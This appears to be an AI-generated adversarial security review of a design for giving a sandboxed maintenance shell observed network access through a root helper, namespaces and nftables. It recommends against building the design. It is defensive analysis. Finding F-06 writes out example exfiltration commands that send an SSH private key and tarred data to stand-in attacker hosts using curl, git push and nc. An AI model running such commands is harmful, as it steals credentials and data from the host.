# observed-route DESIGN panel: x-ai/grok-4.5

_finish=stop seconds=226.7 cost=$0.0961 usage={'prompt_tokens': 17806, 'completion_tokens': 10111, 'total_tokens': 27917, 'cost': 0.0960604, 'is_byok': False, 'prompt_tokens_details': {'cached_tokens': 128, 'cache_write_tokens': 0, 'audio_tokens': 0, 'video_tokens': 0}, 'cost_details': {'upstream_inference_cost': 0.0960604, 'upstream_inference_prompt_cost': 0.0353944, 'upstream_inference_completions_cost': 0.060666}, 'completion_tokens_details': {'reasoning_tokens': 3054, 'image_tokens': 0, 'audio_tokens': 0}}_

# ADR 0005 — Adversarial Design Review

**Stance:** author-wrong-until-proven. No code exists; this is architecture only.
**Calibration:** distinguish real breaks from residuals the ADR already concedes (DNS/UDP payload, blocklist deputies, async laundering).

---

## FINDINGS

### F-01 / HELPER EXEC LEAVES NO TEARDOWN OWNER / CRITICAL
**WHERE:** §1 steps 1–5 — “torn down on exit” + `setns → drop → exec bwrap`

**CONCRETE ATTACK OR FLAW:**
The helper is specified as a privileged launcher that **execs** bwrap after setup. `exec` replaces the helper image. After a successful join there is **no privileged process left** to:
- `ip netns delete salient_route_u…`
- delete `sr*H`/`sr*C` veths
- delete the per-run nft table/chains (masq, FORWARD observer, INPUT drop, accepts)
- undo `ip_forward=1` (host-global)

On payload exit, SIGKILL, parent kill, or crash mid-setup you get **orphaned routed netns + veth + nft**. A later run’s “observer” may be a different object than the route the shell actually uses, or a stale FORWARD/masq rule may keep forwarding for a name/iif that the new observer no longer keys on.

“Torn down on exit” is **incompatible** with pure exec unless the design silently assumes a non-exec supervisor (fork/wait parent, or a second sudo teardown from Python). That supervisor is not specified.

**ANOTHER CONTROL CATCHES IT?** No. The in-child guard cannot tear down host nft/netns. The ladder does not run on leaked kernel objects. Cached `observed_route_available()` does not sweep orphans.

**FIX-OR-REDESIGN:** Mandatory structure:

```text
helper:
  setup_all()                    # netns, veth, nft, observer — fail → cleanup → exit
  verify_observer_readable()
  pipe/lock proof to child
  fork:
    child: setns → setgroups/setgid/setuid → verify → NNP → exec bwrap
    parent: waitpid → BEST-EFFORT full teardown of ONLY reserved names
  # plus: boot-time/periodic GC of salient_route_* orphans
```

Never exec away your only privileged cleanup context. Teardown must be scoped (`delete table inet salient_route_u…`, never `nft flush ruleset`) and idempotent.

---

### F-02 / IN-CHILD GUARD CANNOT VERIFY HOST OBSERVER / CRITICAL
**WHERE:** §3 “in-child guard emits POSITIVE token only after … observer is live”

**CONCRETE ATTACK OR FLAW:**
The maintenance guard (from PR #42) can prove, from inside:
- netns inode ≠ parent (when unshare-net)
- Cap* all-zero + NoNewPrivs=1
- deputy paths are char-devs

It **cannot** prove a host-netns `FORWARD`/`iifname` hook is installed and recording. From the sandbox you have no CAP_NET_ADMIN on the host, no reliable read of `nft list`, and no integrity view of the host ruleset. Connectivity (“I can ping 1.1.1.1”) proves **routing**, not **observation**.

So the positive token can mean “routed + caps dropped + masks OK” while the observer table was never installed, was deleted by a concurrent GC, or keys on the wrong iifname — i.e. **routed-but-unobserved with a green token**. That is exactly the false claim the ladder claims to forbid.

**ANOTHER CONTROL CATCHES IT?** The pre-run host probe is necessary but not sufficient (TOCTOU with the live run). Payload-time token whitelist does not close this if the token’s “observer live” bit is unenforceable in-child.

**FIX-OR-REDESIGN:** Split proofs:
1. **Helper-parent** (privileged) installs observer, reads it back (`nft -j list set …`), only then forks child.
2. Parent hands child an unforgeable, single-use proof (e.g. random token written to a sealed memfd/pipe the child inherits; parent only creates it after observer readback).
3. In-child guard checks netns identity (see F-05) + caps/masks + **presence of inherited proof fd/token** — not “observer live” by introspection.
4. Caller whitelists on child sentinel **and** parent exit/teardown status.

If observer readback fails → teardown route → do not start payload → fall back `SANDBOX_ROUTELESS`.

---

### F-03 / FORWARD ACCEPT IS A PIVOT HOLE (LAN / DOCKER / METADATA) / CRITICAL
**WHERE:** §1.3 “FORWARD policy-drop with explicit accept only for observed protocols (TCP+UDP established/new, ICMP)”

**CONCRETE ATTACK OR FLAW:**
Protocol-only accepts on `iifname sr*H` without **strict egress path binding** turn the host into a router for the maintenance shell to **any** destination the host kernel can FORWARD to:
- other docker/podman bridge subnets (container lateral movement)
- RFC1918 LAN / internal K8s
- cloud link-local **metadata** (`169.254.169.254`) if the host has a route
- any internal VIP the host would forward

Masquerade “scoped to the `/30` out the uplink” does **not** prevent FORWARD to non-uplink interfaces; masq is POSTROUTING, after FORWARD verdict. INPUT-drop-from-veth only protects host-local sockets, not east-west FORWARD.

So “observed maintenance internet” quietly becomes “observed host-router for the approved shell.” Dest audit will log internal IPs, but the governance intent (controlled egress) is already violated; many of those dests are worse than public exfil.

**ANOTHER CONTROL CATCHES IT?** Deputy socket masks: no (this is L3 forward, not docker.sock). egress.py caps: no (second path). Observer: logs the pivot, does not block it. Routeless fallback: only if this rung is abandoned.

**FIX-OR-REDESIGN:** Belt-and-suspenders nft on the host:

```text
# pseudocode — per-run table
chain forward {
  type filter hook forward priority filter; policy drop;
  iifname != "sr<runid>H" accept   # don't own the whole host forward path
  iifname "sr<runid>H" oifname != "<uplink>" drop
  iifname "sr<runid>H" ip daddr { 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 127.0.0.0/8 } drop
  # then: ct state established,related accept
  # new tcp/udp + icmp (pmtu) accept — and update @dests
}
```

Pin uplink at install time; deny non-global destinations by default; never “accept TCP/UDP broadly.” Treat “what maintenance needs” as an allow profile, not “all forwarded TCP.”

---

### F-04 / ROOT HELPER THAT EXECS PAYLOAD IS A NET LOSS AS SPECIFIED / HIGH
**WHERE:** §1 privilege boundary; trade item (2); sudo invocation

**CONCRETE ATTACK OR FLAW:**

**Drop sequence (kernel semantics):**
- Required order: `setgroups([])` → `setgid` → `setuid` (uid first permanently loses group privilege).
- Must also: clear ambient capabilities (`capset` / `PR_CAP_AMBIENT_CLEAR_ALL`), empty bounding set if held, `prctl(PR_SET_NO_NEW_PRIVS,1)` **before** exec of any attacker-influenced path, close all FDs except deliberate proof/stdio (netlink/nft/netns FDs left open are a classic leak), scrub env (`LD_*`, `NFT_*,` `IP_*`), fixed cwd, and verify post-drop via `/proc/self/status` (`Uid`/`Gid`/`Cap*`/`NoNewPrivs`) **before** exec.
- Design mentions setgroups/setgid/setuid + “verify the drop” but omits NNP-at-helper, ambient, FD endgame, env. bwrap sets NNP later; the window helper→bwrap and bwrap’s own exec of `sh -c` must not re-gain privs via fcaps on a path the full-`/` view can influence. (PR #42 already relies on bwrap NNP; helper must not weaken that.)

**Argv / sudo surface:**
- `sudo -n salient-route-helper <args>` is safe **only if** sudoers is not `helper *` and the helper parser treats payload as opaque **after** a hard separator, never feeding model/human argv into `ip`/`nft`/names.
- Any `system(3)`/`shell` interpolation of runid/uid is an injection bug class. runid must be constrained `[A-Za-z0-9]{n}` from a CSPRNG owned by the caller, not from payload.
- Fixed-arg claim is sound **in principle**; it is not sealed by the ADR text alone.

**/run/netns races:**
- Classic `ip netns` path walks `/run/netns/<name>`. If the helper uses path-based setns and `/run/netns` is ever sticky/user-writable (some setups bind it oddly), symlink/rename races exist historically.
- Safer: `unshare(CLONE_NEWNET)` + hold `open("/proc/self/ns/net")` FD in the setup process; `setns(fd)` in the child; bind-mount into `/run/netns` only for admin visibility if needed — **never** re-open by name for the trust join. Only touch names matching `^salient_route_u<uid>_[0-9a-f]+$`.

**Collision / concurrent runs:**
- Name `salient_route_u<uid>_<runid>` is fine if runid is unique per concurrent run and create is `O_EXCL`-style fail. Second concurrent run with reused runid must hard-fail, not join an existing ns.

**Is root-exec-payload acceptable at all?**
Pattern is old (`ip netns exec`, `nsenter`). Acceptable **only** with fork/parent teardown (F-01), FD/NNP hygiene, and zero payload influence on privileged steps. As a **net loss vs routeless:** yes, unless network for maintenance is a hard requirement — you add a root RCE/bug class that today’s path does not have. Full-FS write as collaborator uid is already bad; **helper memory corruption / arg bug is root on the host**. That is a real escalation of the trust ceiling.

**ANOTHER CONTROL CATCHES IT?** bwrap cap-drop/NNP/masks catch **post-drop** payload escapes of the PR #42 class. They do **not** catch bugs in the root setup path. sudo `-n` does not catch permissive sudoers.

**FIX-OR-REDESIGN:** Parent/child helper (F-01); memfd-sealed binary optional; strict sudoers (`NOPASSWD: /usr/local/lib/salient/salient-route-helper` with no args, or args only from a root-owned profile); all names from `(uid, CSPRNG runid)`; FD_CLOEXEC + explicit close; NNP before drop; verify; never pass payload to privileged code paths. Prefer **not building** if the only goal is convenience (see META).

---

### F-05 / NETNS IDENTITY CHECK BREAKS WHEN NOT UNSHARING NET / HIGH
**WHERE:** §1.5 inherit netns; `maintain.py` `_guarded_script(parent_ino)` when `unshare_net=False`

**CONCRETE ATTACK OR FLAW:**
Today’s guard, when `unshare_net=True`, asserts `/proc/self/ns/net` inode **≠** parent. For the observed route, bwrap is invoked **without** `--unshare-net`, so the child **intentionally shares** the prepared netns with whatever process setns’d.

If the guard is naively reused:
- Comparing to the **Python parent’s** host netns: prepared ns ≠ host → passes, but does **not** prove you are in the **helper-prepared** ns (could be host if setns failed open, or a wrong ns).
- Comparing to “must differ from parent” while parent already setns’d into the route ns: inode **equals** parent → **false fail** → never emits token → ladder lies about availability or always falls back.

Also: after helper setns+drop+exec bwrap, bwrap’s userns child still has the same netns inode — good — but **who is “parent_ino”** measured against must be the **host** inode captured **before** any setns, and the guard must assert **equality to the prepared ns inode** (helper-supplied), not inequality to caller.

Without a helper-supplied expected inode (or `/proc/self/ns/net` pinned by setup), “we are in the observed ns” is unproven.

**ANOTHER CONTROL CATCHES IT?** Observer iifname attribution assumes traffic enters `sr*H`. If you never joined that ns and somehow got host net, you bypass the veth observer entirely (and may have full host network) — catastrophic. If setns failed and you dropped+exec on host net as collaborator uid **without** bwrap unshare-net, you are worse than UNISOLATED with a confused ladder.

**FIX-OR-REDESIGN:** Helper captures `expected_ino = stat(/proc/self/ns/net)` after creating/joining prepared ns; passes it in the sealed proof (F-02). Guard:

```text
ino=$(stat -Lc %i /proc/self/ns/net)
[ "$ino" = "$EXPECTED_INO" ] || fail
# optional: reject if ino equals HOST_INO passed as second value
```

When `unshare_net=False`, **disable** the old “≠ parent” check; replace with expected-ino equality. Probe path must use the same guard.

---

### F-06 / RE-OPENED CHANNEL QUIETLY DEMOTES EGRESS GOVERNANCE / HIGH
**WHERE:** Trade (1); §2 observer as EVIDENCE not gate; context “sole IP path”

**CONCRETE ATTACK OR FLAW:**
Routeless made a **load-bearing global invariant**: *any* IP byte off the machine from collaborator work is either (a) through `egress.py` (URL/method/body + `net.get`/`net.post` caps) or (b) async laundering via full-FS write (documented residual).

Observed route adds a **synchronous bulk IP path** that:
- does not enforce allowlists
- does not see method/body/SNI/HTTP
- is available whenever a human opts into `run_command` with this rung

Concrete misuse (deceived-human / malicious approved command):

```bash
curl -Fs @/home/collab/.ssh/id_rsa https://attacker.example/x
git push https://attacker/exfil.git
tar czf - /var/lib/salient | nc attacker 443
```

All succeed; audit shows `{attacker_ip}:443` (or DNS resolver IPs + CDN IPs). No cap check. No content. The same-channel story for the **system** is false; it remains true only for the **egress.py channel**.

“Observed, not mediated” is **coherent as an operator posture for human maintenance** only if the rest of the system stops claiming “egress is governed.” It is **not** coherent with marketing the dest-set as equivalent assurance to egress.py reconciliation. A reviewer should **not** trust dest-set-only as proof of non-exfil — only as proof of **contacted endpoints**, with large blind spots (F-07, conceded DNS/QUIC).

**ANOTHER CONTROL CATCHES IT?** Human approval of the command string — partial, social. Deputy masks — unrelated. Laundering residual already existed — but this **lowers** the bar from “must plant async persistence” to “one curl in the approved session.”

**FIX-OR-REDESIGN (policy, not just mechanism):**
- Explicitly restate the system invariant: `egress.py` = sole **mediated** path; maintenance observed route = **human-bulk**, dest-audited, **not** under `net.*` caps.
- Bind the rung to a **separate** capability e.g. `shell.observed_network` (not implied by maintenance alone); default off.
- If the operator needs “apt/git over network” without bulk exfil, the honest richer control is the **content-mediating proxy** alternative (SNI/allowlist), not dest-only FORWARD logging.
- Never attach dest-set to `Decision` as if it were `egress_reconciled=True` evidence of the same class.

---

### F-07 / OBSERVER COMPLETENESS GAPS → FALSE “OBSERVED” / HIGH
**WHERE:** §2 FORWARD/iifname recorder; §1.3 accept set; §1.4 IPv6

**CONCRETE ATTACK OR FLAW:**

| Gap | Effect |
|-----|--------|
| **Fragment first packets** without L4 header | `tcp dport`/`udp dport` match fails; if recorder is port-keyed and accept is port-keyed, fragments may drop (DoS) **or** if accept is broader than record, **unrecorded forward** |
| **IPv6 half-disable** | Any miss on `disable_ipv6` in ns + host having v6 forward = second exit; ADR says don’t half-configure — must **enforce** fail-closed if v6 not symmetrically observed |
| **l4proto beyond TCP/UDP/ICMP** | Raw sockets, SCTP, GRE, etc. — policy drop is the right belt **iff** default DROP and no conntrack helpers reopen paths |
| **Recorder ≠ enforcer mismatch** | If accept allows proto X but set update only on TCP (copy-paste from old OUTPUT observer), UDP/DNS/QUIC egress is **live but missing from dest set** while token stays green |
| **ICMP** | Needed for PMTU; record `ip daddr` without port; fine. Ensure not a covert channel you claim to fully observe |
| **nft set timeout 10m / dynamic** | Long sessions OK; very long runs may lose dest elements before attach-to-Execution if snapshot is late |
| **Attribution** | `iifname` on dedicated veth is strong **if and only if** no other traffic can ingress that ifname (nothing else moves into that veth) |

“Policy drop + explicit accept” **is** the right belt. The accept set for “real maintenance” needs at least: UDP/53 (or TCP/53), TCP ephemeral out, ICMP type 3/code 4 (and related), established/related. That is still not “complete observation of what” — only where.

**False-observed definition:** any packet that leaves the veth toward an external dest without a dest-set update while the run is marked OBSERVED_ROUTE. The critical integrity requirement is **accept ⊆ recorded** (every accepted new flow updates the set on first packet), not record ⊆ accept.

**ANOTHER CONTROL CATCHES IT?** Guard token — only if F-02 fixed and parent verified ruleset text matches a template hash. Not otherwise.

**FIX-OR-REDESIGN:** Single nft ruleset template where the **same** expression updates `@dests` and accepts; `meta l4proto { tcp, udp } ct state new update @dests … accept`; fragments: `ct state established,related accept` early; drop policy; reject v6 unless full twin; parent `nft -j list` must match expected JSON shape before proof token; attach dest snapshot in parent at teardown (not only in-child).

---

### F-08 / JOIN VIA ROOT SETNS + INHERIT IS CORRECT; BWRAP INTERACTION SUBTLE / MEDIUM
**WHERE:** §1.5 join; questions on userns/cap-drop

**CONCRETE ATTACK OR FLAW:**
- Unprivileged `setns` into a root-created netns in init_user_ns: **correctly denied** without CAP_SYS_ADMIN in a userns that owns that netns. Root helper setns then drop is the standard approach.
- bwrap **inheriting** netns (no `--unshare-net`) is valid. `--unshare-user` + `--cap-drop ALL` + `--disable-userns` still apply to the user/mount capability domain; they do not strip the inherited netns routing table.
- Bad interaction to watch: bwrap `--unshare-net` accidentally left on → fresh routeless ns **discards** the prepared route (fail closed to no net — OK but breaks feature).  
- `--share-net` is not a thing; inheritance is default when not unsharing. Good.
- Payload with caps dropped cannot add routes/interfaces in that netns → cannot bypass veth toward a second interface **inside** the ns. Escape is host FORWARD policy (F-03), not ns reconfig.
- Simpler join: `nsenter --net=/proc/<setup-pid>/ns/net` from a retained setup process; or hold netns fd and `setns` — same security class, clearer FD ownership than `/run/netns` name.

**Residual:** none architectural if F-01/F-05 fixed. Not a break by itself.

**ANOTHER CONTROL CATCHES IT?** PR #42 masks/caps still apply.

**FIX-OR-REDESIGN:** Document inheritance explicitly; assert in guard that netns ino == expected; never combine with `--unshare-net`; prefer ns fd over name path.

---

### F-09 / FAIL-CLOSED LADDER HAS ROUTES TO ROUTED-UNOBSERVED / HIGH
**WHERE:** §3 ladder + probe cache; teardown; monotonicity claim

**CONCRETE ATTACK OR FLAW:**

1. **Setup order bug:** route/masq up before observer install → crash window → routed, no observer (F-01/F-02).
2. **Positive-only cache of `observed_route_available()`:** like other probes, a cached “yes” after operator `nft delete table` or sysctl change → run still **re-installs** per helper if coded correctly; if live run skips re-verify and trusts cache alone → stale. ADR says per-run guard; F-02 says guard can’t see observer.
3. **Teardown leaves veth:** next run creates new observer on new iif; orphan veth still forwarded by leftover accept rules if those were not iif-specific enough (wildcard) → unobserved path.
4. **`ip_forward=1` sticky:** broader host attack surface permanently; not “unobserved egress” by itself but posture regression.
5. **Probe ≠ live config:** probe install/teardown succeeds; live run’s helper binary path replaced (TOCTOU on `/usr/local/lib/salient/salient-route-helper`) — sudo executes root-owned file each time if permissions are correct; if directory writable, game over (deploy integrity, out of band).
6. **Monotonic ladder honesty:** `OBSERVED_ROUTE` is **not** strictly stronger isolation than `SANDBOX_ROUTELESS` — it is **weaker network confinement** with **stronger audit of destinations**. Calling the ladder “strictly weaker each rung” is **false** if read as security-strength. It is a **capability/availability** ladder, not a confinement ladder. Mislabeling causes operators to prefer the top rung as “best security.”

**ANOTHER CONTROL CATCHES IT?** Fail-closed token helps only with integrated parent proof (F-02). Nothing catches mis-described ladder semantics.

**FIX-OR-REDESIGN:**
- Atomicity: build ns offline → install observer+policy → verify → only then move veth peer / add default route inside ns (payload cannot race before route exists).
- No green OBSERVED without parent observer readback + child expected-ino + teardown OK (or explicit “teardown failed” flag on Execution).
- Rename ladder presentation: “network functionality rungs” with **confinement grade** separate: `ROUTELESS > OBSERVED_ROUTE > UNISOLATED`.
- GC orphans; don’t cache across uid/helper-binary mtime without re-probe.

---

### F-10 / FULL-FS WRITE + LIVE NETWORK AMPLIFIES LAUNDERING / MEDIUM
**WHERE:** Trade (3); maintain.py residuals; observed route

**CONCRETE ATTACK OR FLAW:**
Documented residual: plant cron/systemd/`authorized_keys` for later unisolated egress. With live network in the **same** approved session, the attacker need not wait — direct exfil + still plant persistence for unobserved future paths. Dest audit may not be retained with the same TTL as the persistence. Not a new class, but **severity uplift** of an admitted residual.

**ANOTHER CONTROL CATCHES IT?** Dest logging of the sync path only.

**FIX-OR-REDESIGN:** If you ship this, pair with reduced FS scope for network-enabled maintenance (split “break-glass FS maintenance” vs “networked package ops”), or accept and document the uplift explicitly in the ADR threat model — not as “same residual.”

---

### F-11 / SUDOERS / ARGV BOUNDARY UNDER-SPECIFIED / MEDIUM
**WHERE:** `sudo -n <helper> <argv>`

**CONCRETE ATTACK OR FLAW:**
Same posture as egressobserver’s `sudo -n nft` is **not** the same risk: nft gets fixed subcommands from a root-owned Python module; the route helper must take a runid and eventually a payload command. Surfaces:
- permissive sudoers `helper *`
- payload before drop via `helper --cmd curl …` parsed by root
- environment retain (`env_keep+=LD_PRELOAD` misconfig)
- argv length/encoding bugs in a C helper

**ANOTHER CONTROL CATCHES IT?** Fixed-arg policy if implemented; not present yet.

**FIX-OR-REDESIGN:** Helper CLI: `salient-route-helper --run-id <hex> --uid <n>` only; payload via `exec -- bwrap … -- $payload` where payload argv is **appended by the already-dropped code path** from a file descriptor written by the **unprivileged** parent Python (not via sudo argv). Even better: Python parent runs bwrap unprivileged **if** it can join netns — it can’t; so: parent opens socketpair, root helper only setns’s a **pre-exec child** created with `CLONE_NEW*` carefully — keep payload argv out of the privileged process’s argument vector entirely (`execve` from dropped uid reading argv from a pipe).

---

### F-12 / DEST-SET-ONLY AUDIT TRAIL IS WEAK EVIDENCE / LOW–MEDIUM
**WHERE:** §2 “EVIDENCE, not a gate”; attach dest set to Execution

**CONCRETE ATTACK OR FLAW:**
Reviewer sees `1.2.3.4:443`. Cannot distinguish `apt` mirror vs secret exfil vs HTTPS CONNECT tunnel vs DoH. Multiple flows to CDN collapse. UDP payloads invisible (conceded). This is fine as **telemetry**, dangerous as **compliance evidence** of “no unauthorized data export.”

**ANOTHER CONTROL CATCHES IT?** No technical control — process/policy only.

**FIX-OR-REDESIGN:** Label field `maintenance_dests_observed` never `egress_reconciled`; UI warnings; retain pcap optional for high-assurance (probably out of scope).

---

## META-QUESTION

### Is this worth building vs keeping maintenance network-less?

**No — not as specified, and probably not even if repaired, given the stated alternatives.**

| Option | New root surface | Sync bulk egress | Content control | Deps | Fits “stdlib/system binaries” |
|--------|------------------|------------------|-----------------|------|-------------------------------|
| **Keep network-less** | None | No | N/A (no path) | None | Yes |
| **ADR 0005 repaired** | Yes (helper+nft+forwarding) | Yes, dest-logged | None | None new | Yes |
| **pasta/slirp4netns** | No (unpriv) | Yes | Optional skuid observer works | **New** userspace stack | Breaks discipline |
| **Content-mediating proxy** | Moderate | Yes | SNI/allowlist/caps | More code | Possible with system tools |

**Why the trade fails the “worth it” test even if F-01–F-09 were fixed:**

1. **Invariant destruction:** The strongest thing ADR 0003 bought was *sole IP path = egress.py*. Dest-only observation does not restore an equivalent governance property; it substitutes **forensics** for **control**. For a salience/control-plane story, that is a demotion, not a lateral move.
2. **Root helper exec** raises the ceiling from “malicious maintenance as collab uid + laundering” to “bug classes that are root.” Maintenance already has full-`/` write — adding root setup **for convenience of apt/git** is a poor exchange on a governed agent host.
3. **Operator already rejected pasta** for dependency reasons — that is consistent — but the **correct** response to “we need network without destroying sole-path” is either **stay network-less** (operator does networked ops) or invest in a **mediating** chokepoint that can apply the same `net.*` policy family. Dest-only FORWARD is the awkward middle: maximum kernel coupling, minimum policy fidelity.
4. **Human-approved** does not neutralize deceived-human / prompt-injection-approved `run_command`; the design uses human approval as if it were a security boundary equivalent to mediation. It is not.

**When it *would* be worth building:** dedicated operator-maintained break-glass hosts where (a) `shell.observed_network` is rare, (b) FORWARD is pinned to uplink + deny-private, (c) helper is tiny audited C with parent teardown, (d) org explicitly accepts dest-only audit. That is a product choice, not a free upgrade to ADR 0003.

---

## STEELMAN

The design correctly identifies that OUTPUT/skuid cannot see NAT-forwarded traffic, that a dedicated veth + FORWARD/iifname is the right kernel attribution point, that unprivileged join of a root-owned netns requires a privileged setns, and that a monotonic fail-closed ladder with honest UNISOLATED is the right UX shape. Privilege-drop-before-payload with fixed setup args is the only acceptable helper shape, and policy-drop FORWARD is the right belt around an observational set. Those choices are directionally right for *forced observed routing* as a networking pattern.

---

## VERDICT

**SERIOUS_FLAWS** — Multiple critical architectural holes (no teardown owner after exec, in-child “observer live” proof is unenforceable, FORWARD accept as LAN/metadata pivot, ladder mis-ranked as confinement, sole-path invariant demoted without equivalent control) mean the design is **not safe to build as written**; even repaired, the governance trade is a net loss versus **keeping maintenance network-less**.

**Single highest-value change:** **Do the alternative: keep maintenance network-less** (operator/mediated `net.post` for needed network). If network is non-negotiable later, skip dest-only and build the **content-mediating proxy** (or accept pasta and the skuid observer) rather than a root helper that reopens bulk IP.

If the panel were forced to salvage ADR 0005 anyway, the single highest-value *mechanical* change would be: **fork/parent ownership of setup→verify observer readback→sealed proof→wait→teardown**, with FORWARD **oif=uplink + deny-non-global**, and guard **expected-netns-ino equality** — but that still would not make the trade worth it.
